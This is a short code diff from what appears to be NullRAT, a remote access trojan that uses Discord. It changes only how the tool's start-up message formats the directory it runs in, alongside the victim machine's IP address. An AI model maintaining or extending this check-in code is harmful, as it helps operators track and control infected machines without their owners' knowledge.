@@ -23,7 +23,7 @@ if os.path.isdir(nr_working) != True:
 async def on_ready():
     embed = Embed(
         title = f"NullRAT v8.4 started on: **{ip_addr}**", 
-        description = f"Currently present in: **{original_dir}**",
+        description = f"Currently present in:\n```{original_dir}```",
         timestamp = datetime.now()
     ).set_author(
         name="NullCode1337", 
